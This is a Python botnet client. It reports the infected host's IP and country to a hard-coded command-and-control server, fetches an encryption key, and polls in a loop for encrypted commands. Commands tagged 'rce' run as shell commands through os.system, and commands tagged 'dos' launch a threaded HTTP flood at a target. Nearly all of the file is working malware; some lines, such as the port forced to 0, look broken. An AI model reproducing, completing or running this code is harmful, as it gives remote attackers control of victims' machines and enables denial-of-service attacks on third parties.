# imports
import base64, time, requests, os
from os import system, name
from cryptography.fernet import Fernet
import json, html, threading, random, sys

# setting the cnc server
cnc_server = 'https://fcnc.cloudcant.repl.co'


def encode(data, key):
  f = Fernet(key)
  token = f.encrypt(data.encode("utf-8"))
  return (token.decode("utf-8"))


def decode(data, key):
  f = Fernet(key)
  return ((f.decrypt(data)).decode("utf-8"))


# getting bot ip
def getinfo(type):
  response = requests.get('http://ifconfig.net/json')
  infojson = html.unescape(response.text)
  info = json.loads(infojson)
  return info[type]


botinfo = f"{getinfo('ip')}@{getinfo('country')}"

# sending bot info
requests.get(f"{cnc_server}/bot?connect={botinfo}")


# clear the console supporting cross platform
def clear():
  if name == "nt":
    _ = system("cls")
  else:
    _ = system("clear")


# gettingn the command from the cnc server
def getcommand():
  global cnc_server
  cnc = requests.get(f"{cnc_server}/bot")
  command = html.unescape(cnc.text)
  return command


# getting the if toggle
def getcheck():
  cnc_check = requests.get(f"{cnc_server}/check")
  check = html.unescape(cnc_check.text)
  return check


def getkey():
  response = requests.get(f"{cnc_server}/key")
  key = html.unescape(response.text)
  return key


fernetkey = getkey().encode("utf-8")


# logs
def log(check):
  global command
  command = getcommand()
  clear()
  print(f"""
  {botinfo}
  ├── {cnc_server}/key
  │   └── {fernetkey}
  │       └── Test encryption
  │           ├── {encode("Hello, World!", fernetkey)}
  │           └── {decode((encode("Hello, World!", fernetkey)), fernetkey)}
  ├── {cnc_server}/bot
  │   ├── {command}
  │   └── {decode(command, fernetkey)}
  └── {cnc_server}/bot?check
      ├── {encode(check, fernetkey)}
      └── {check}
""")


# denial of service example
def dos(host2, port, reqs):
  print(f"""
  ├── {botinfo}
  │
  ├── DOS
  │   ├── {host2}
  │   ├── {port}
  │   └── {reqs}
""")
  import random
  import socket
  import string
  import sys
  import threading
  import time

  # Parse inputs
  ip = host2
  port = 0
  num_requests = reqs

  # Convert FQDN to IP
  try:
    host = str(host2).replace("https://", "").replace("http://",
                                                      "").replace("www.", "")
    ip = socket.gethostbyname(host)
  except socket.gaierror:
    print(" ERROR\n Make sure you entered a correct website")
    pass

  # Create a shared variable for thread counts
  thread_num = 0
  thread_num_mutex = threading.Lock()

  # Print thread status
  def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    #print the output on the sameline
    sys.stdout.write(
      f"\r {time.ctime().split( )[3]} [{str(thread_num)}] #-#-# Hold Your Tears #-#-#"
    )
    sys.stdout.flush()
    thread_num_mutex.release()

  # Generate URL Path
  def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data

  # Perform the request
  def attack():
    print_status()
    url_path = generate_url_path()

    # Create a raw socket
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
      # Open the connection on that raw socket
      dos.connect((ip, port))

      # Send the request according to HTTP spec
      #old : dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
      byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
      dos.send(byt)
    except socket.error:
      print(f"\n [ No connection, server may be down ]: {str(socket.error)}")
    finally:
      # Close our socket gracefully
      dos.shutdown(socket.SHUT_RDWR)
      dos.close()

  print(
    f"[#] Attack started on {host} ({ip} ) || Port: {str(port)} || # Requests: {str(num_requests)}"
  )

  # Spawn a thread per request
  all_threads = []
  for i in range(num_requests):
    t1 = threading.Thread(target=attack)
    t1.start()
    all_threads.append(t1)

    # Adjusting this sleep time will affect requests per second
    time.sleep(0.01)

  for current_thread in all_threads:
    current_thread.join()  # Make the main thread wait for the children threads


# main process loop

while True:
  # getting if toggled
  status = decode(getcheck(), fernetkey)
  # if toggle is set to listen
  if status == 'listen':
    log('Listen')
    commanddec = decode(getcommand(), fernetkey)
    # checks command type
    if '*rce*' in commanddec:
      os.system(str(commanddec).replace('*rce*', ''))
    elif '*dos*' in commanddec:
      host, port, reqs = str(commanddec.replace('*dos*', '')).split('::')
      dos(host, port, reqs)
    elif "*print*" in commanddec:
      print(str(commanddec.replace('*print*', '')))
    # if the command has nothing in it pass
    else:
      pass
    time.sleep(2)
  # else if toggle is set to off
  elif status == 'off':
    log('Off')
    time.sleep(2)
  # else than log err
  else:
    log('err')
    time.sleep(2)
